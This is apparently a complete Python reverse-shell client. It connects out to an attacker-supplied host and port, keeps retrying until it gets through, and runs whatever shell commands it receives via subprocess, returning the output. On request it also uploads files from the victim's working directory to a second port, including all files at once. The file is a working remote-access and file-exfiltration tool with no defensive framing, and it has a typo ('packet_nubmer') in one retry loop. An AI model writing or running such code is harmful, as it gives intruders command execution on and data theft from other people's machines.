#!/usr/bin/env python

import socket, sys, time, subprocess, os

SEPARATOR = "<sep>"
CHECKER = "<check>"

class Client:
	def __init__(self, host, port, buffer_size=1024, verbose=False):
		self.host = host
		self.port = port
		self.buffer_size = 1024
		self.verbose = verbose
	def connect(self):
		self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		if self.verbose:
			print(f"[+] [{time.strftime('%H:%M:%S', time.localtime())}] : Socket Created Successfully as {self.host}:{self.port}")
		while True:
			try:
				self.socket.connect((self.host, self.port))
				if self.verbose:
					print(f"[+] [{time.strftime('%H:%M:%S', time.localtime())}] : Successfully Connected to {self.host}:{self.port}")
				break
			except:
				if self.verbose:
					print(f"[-] [{time.strftime('%H:%M:%S', time.localtime())}] : Can't connect to the Server {self.host}:{self.port}")
	def disconnect(self):
		self.socket.close()
		if self.verbose:
			print(f"[+] [{time.strftime('%H:%M:%S', time.localtime())}] : Connection Terminated Successfully with {self.host}:{self.port}")
	def send(self, message):
		message_size = len(message)
		packets_number = message_size//self.buffer_size
		self.socket.send(str(message_size).encode())
		self.socket.recv(self.buffer_size)
		for packet_number in range(packets_number):
			self.socket.send(message[packet_number*self.buffer_size:(packet_number+1)*self.buffer_size].encode())
			response = self.socket.recv(self.buffer_size).decode()
			while response == "0":
				self.socket.send(message[packet_number*self.buffer_size:(packet_nubmer+1)*self.buffer_size].encode())	
				response = self.socket.recv(self.buffer_size).decode()
		if message_size % self.buffer_size != 0:
			self.socket.send(message[-(message_size%self.buffer_size):].encode())
			response = self.socket.recv(self.buffer_size).decode()
			while response == "0":
				self.socket.send(message[-(message_size%self.buffer_size):].encode())
				response = self.socket.recv(self.buffer_size).decode()
	def receive(self):
		message = b""
		message_size = int(self.socket.recv(self.buffer_size).decode())
		packets_number = message_size//self.buffer_size
		self.socket.send("A".encode())
		for packet_number in range(packets_number):
			packet = self.socket.recv(self.buffer_size)
			while len(packet) < self.buffer_size:
				self.socket.send("0".encode())
				packet = self.socket.recv(self.buffer_size)
			self.socket.send("1".encode())
			message += packet
		if message_size % self.buffer_size != 0:
			packet = self.socket.recv(message_size%self.buffer_size)
			while len(packet) < message_size % self.buffer_size:
				self.socket.send("0".encode())
				packet = self.socket.recv(message_size%self.buffer_size)
			self.socket.send("1".encode())
			message += packet
		return message.decode()
class UploadClient(Client):
	def __init__(self, host, port, buffer_size=1024, verbose=False):
		super().__init__(host, port, buffer_size, verbose)
	def uploadFile(self):
		file_name = self.receive()
		if os.path.isfile(file_name):
			with open(file_name, 'rb') as f:
				data = f.read()
				file_size = len(data)
				self.socket.send(str(file_size).encode())
				self.socket.recv(1)
				packets_number = file_size//self.buffer_size
				uploaded_data = 0
				for packet_number in range(packets_number):
					self.socket.send(data[packet_number*self.buffer_size:(packet_number+1)*self.buffer_size])
					response = self.socket.recv(1).decode()
					while response == "0":
						self.socket.send(data[packet_number*self.buffer_size:(packet_number+1)*self.buffer_size])
						response = self.socket.recv(1).decode()
					uploaded_data += self.buffer_size
				if file_size % self.buffer_size != 0:
					self.socket.send(data[-(file_size%self.buffer_size):])
					response = self.socket.recv(1).decode()
					while response == "0":
						self.socket.send(data[-(file_size%self.buffer_size):])
						response = self.socket.recv(1).decode()
					uploaded_data += file_size%self.buffer_size
				print(f"[+] [{time.strftime('%H:%M:%S', time.localtime())}] : Uploaded File = {file_name}")
		else:
			self.send("File Not Found!")

def change_path(path):
	try:
		os.chdir(path)
		return f"CWD changed to {path}"
	except:
		return f"{path} Not Found!"

def main(host, port, buffer_size):
	client = Client(host, port, buffer_size, verbose=True)
	client.connect()
	response = client.receive()
	client.send(os.getcwd())
	while response != "exit":
		response = client.receive()
		if response == CHECKER:
			continue
		if response.startswith("local"):
			continue
		print(f"[{time.strftime('%H:%M:%S', time.localtime())}] {client.host}:{client.port} : {response}")
		if response.startswith("download"):
			file_name = response[9:]
			if file_name == "*":
				files = os.listdir(os.getcwd())
				files = [item for item in files if os.path.isfile(os.getcwd()+"/"+item)]
				files_number = len(files)
				message = ""
				for item in files[:files_number-1]:
					message += item + ","
				message += files[files_number-1]
				client.send(message)
			else:
				try:
					files = file_name.split(", ")
				except:
					files = [file_name]
			uploadClient = UploadClient(client.host, client.port+1, client.buffer_size, client.verbose)
			response = client.receive()
			if response == "0":
				print(f"[-] [{time.strftime('%H:%M:%S', time.localtime())}] : Server failed to start!")
				continue
			else:
				uploadClient.connect()
			for i in files:
				uploadClient.uploadFile()
			uploadClient.disconnect()
			continue
		if response.startswith("cd"):
			path = response[3:]
			response = "echo " + change_path(path)
		message = subprocess.getoutput(response) + SEPARATOR + os.getcwd()
		client.send(message)
	client.disconnect()
if __name__ == "__main__":
	SERVER_HOST = sys.argv[1]
	SERVER_PORT = int(sys.argv[2])
	BUFFER_SIZE = int(sys.argv[3])
	main(SERVER_HOST, SERVER_PORT, BUFFER_SIZE)
